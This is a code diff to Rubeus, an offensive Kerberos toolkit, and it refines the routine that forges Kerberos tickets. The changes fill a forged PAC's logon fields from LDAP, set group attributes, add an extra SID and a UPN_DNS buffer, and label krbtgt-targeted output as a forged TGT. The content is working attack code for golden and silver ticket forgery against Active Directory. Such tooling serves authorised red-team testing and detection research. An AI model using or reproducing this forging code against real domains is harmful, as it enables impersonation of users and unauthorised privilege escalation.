@@ -16,6 +16,13 @@ namespace Rubeus
             // initialise LogonInfo section
             var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
             kvi.UserSessionKey = Ndr._USER_SESSION_KEY.CreateDefault();
+            kvi.LogonTime = Ndr._FILETIME.CreateDefault();
+            kvi.LogoffTime = Ndr._FILETIME.CreateDefault();
+            kvi.PasswordLastSet = Ndr._FILETIME.CreateDefault();
+            kvi.KickOffTime = Ndr._FILETIME.CreateDefault();
+            kvi.PasswordCanChange = Ndr._FILETIME.CreateDefault();
+            kvi.PasswordMustChange = Ndr._FILETIME.CreateDefault();
+
 
             // determine domain if not supplied
             string[] parts = sname.Split('/');
@@ -107,7 +114,14 @@ namespace Rubeus
                     foreach (SearchResult u in users)
                     {
                         kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(u.Properties["samAccountName"][0].ToString());
-                        kvi.FullName = new Ndr._RPC_UNICODE_STRING(u.Properties["name"][0].ToString());
+                        if (u.Properties["homedirectory"].Count > 0)
+                        {
+                            kvi.FullName = new Ndr._RPC_UNICODE_STRING(u.Properties["displayname"][0].ToString());
+                        }
+                        else
+                        {
+                            kvi.FullName = new Ndr._RPC_UNICODE_STRING("");
+                        }
                         string objectSid = (new SecurityIdentifier((byte[])u.Properties["objectsid"][0], 0)).Value;
                         string domainSid = objectSid.Substring(0, objectSid.LastIndexOf('-'));
                         kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));
@@ -117,8 +131,14 @@ namespace Rubeus
                         {
                             kvi.LogonTime = new Ndr._FILETIME(DateTime.FromFileTime((long)u.Properties["lastlogon"][0]));
                         }
-                        kvi.LogoffTime = new Ndr._FILETIME(DateTime.FromFileTime((long)u.Properties["lastlogoff"][0]));
-                        kvi.PasswordLastSet = new Ndr._FILETIME(DateTime.FromFileTime((long)u.Properties["pwdlastset"][0]));
+                        if (Int64.Parse(u.Properties["lastlogoff"][0].ToString()) != 0)
+                        {
+                            kvi.LogoffTime = new Ndr._FILETIME(DateTime.FromFileTime((long)u.Properties["lastlogoff"][0]));
+                        }
+                        if (Int64.Parse(u.Properties["pwdlastset"][0].ToString()) != 0)
+                        {
+                            kvi.PasswordLastSet = new Ndr._FILETIME(DateTime.FromFileTime((long)u.Properties["pwdlastset"][0]));
+                        }
                         kvi.PrimaryGroupId = (int)u.Properties["primarygroupid"][0];
                         kvi.UserId = Int32.Parse(objectSid.Substring(objectSid.LastIndexOf('-')+1));
                         kvi.LogonServer = new Ndr._RPC_UNICODE_STRING(domainController.Substring(0, domainController.IndexOf('.')).ToUpper());
@@ -126,17 +146,33 @@ namespace Rubeus
                         {
                             kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING(u.Properties["homedirectory"][0].ToString());
                         }
+                        else
+                        {
+                            kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING("");
+                        }
                         if (u.Properties["homedrive"].Count > 0)
                         {
                             kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING(u.Properties["homedrive"][0].ToString());
+                        }
+                        else
+                        {
+                            kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING("");
                         }
                         if (u.Properties["profilepath"].Count > 0)
                         {
                             kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING(u.Properties["profilepath"][0].ToString());
                         }
+                        else
+                        {
+                            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING("");
+                        }
                         if (u.Properties["scriptpath"].Count > 0)
                         {
-                            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING(u.Properties["scriptpath"][0].ToString());
+                            kvi.LogonScript = new Ndr._RPC_UNICODE_STRING(u.Properties["scriptpath"][0].ToString());
+                        }
+                        else
+                        {
+                            kvi.LogonScript = new Ndr._RPC_UNICODE_STRING("");
                         }
 
                         kvi.GroupCount = u.Properties["memberof"].Count;
@@ -173,7 +209,7 @@ namespace Rubeus
                                 {
                                     string groupSid = (new SecurityIdentifier((byte[])g.Properties["objectsid"][0], 0)).Value;
                                     int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf('-') + 1));
-                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, 0) }, 0, kvi.GroupIds, c, 1);
+                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, 7) }, 0, kvi.GroupIds, c, 1);
                                     c += 1;
                                 }
                             }
@@ -218,17 +254,19 @@ namespace Rubeus
             // overwrite any LogonInfo fields here sections
             kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING("CHOCOLATE");
             kvi.UserAccountControl = 528;
-            kvi.UserFlags = 544;
+            kvi.UserFlags = 32;
             kvi.SidCount = 1;
             kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {
-                    new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier("S-1-18-1")), 0)};
+                    new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier("S-1-18-1")), 7)};
             LogonInfo li = new LogonInfo(kvi);
 
 
-            ClientName cn = new ClientName(DateTime.Now, user);
+            ClientName cn = new ClientName(DateTime.UtcNow, user);
             SignatureData svrSigData = new SignatureData(PacInfoBufferType.ServerChecksum);
             SignatureData kdcSigData = new SignatureData(PacInfoBufferType.KDCChecksum);
             int sigLength = 12;
+
+            UpnDns upnDns = new UpnDns(1, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));
 
             // generate a random session key
             Random random = new Random();
@@ -269,6 +307,7 @@ namespace Rubeus
             List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
             PacInfoBuffers.Add(li);
             PacInfoBuffers.Add(cn);
+            PacInfoBuffers.Add(upnDns);
             PacInfoBuffers.Add(svrSigData);
             PacInfoBuffers.Add(kdcSigData);
             PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
@@ -282,6 +321,7 @@ namespace Rubeus
             PacInfoBuffers = new List<PacInfoBuffer>();
             PacInfoBuffers.Add(li);
             PacInfoBuffers.Add(cn);
+            PacInfoBuffers.Add(upnDns);
             PacInfoBuffers.Add(svrSigData);
             PacInfoBuffers.Add(kdcSigData);
             pt = new PACTYPE(0, PacInfoBuffers);
@@ -341,7 +381,14 @@ namespace Rubeus
 
             string kirbiString = Convert.ToBase64String(kirbiBytes);
 
-            Console.WriteLine("[*] Forged a TGS for '{0}' to '{1}'", info.pname.name_string[0], sname);
+            if (parts[0] == "krbtgt")
+            {
+                Console.WriteLine("[*] Forged a TGT for '{0}@{1}'", info.pname.name_string[0], domain);
+            }
+            else
+            {
+                Console.WriteLine("[*] Forged a TGS for '{0}' to '{1}'", info.pname.name_string[0], sname);
+            }
             Console.WriteLine("[*] base64(ticket.kirbi):\r\n");
 
             if (Program.wrapTickets)
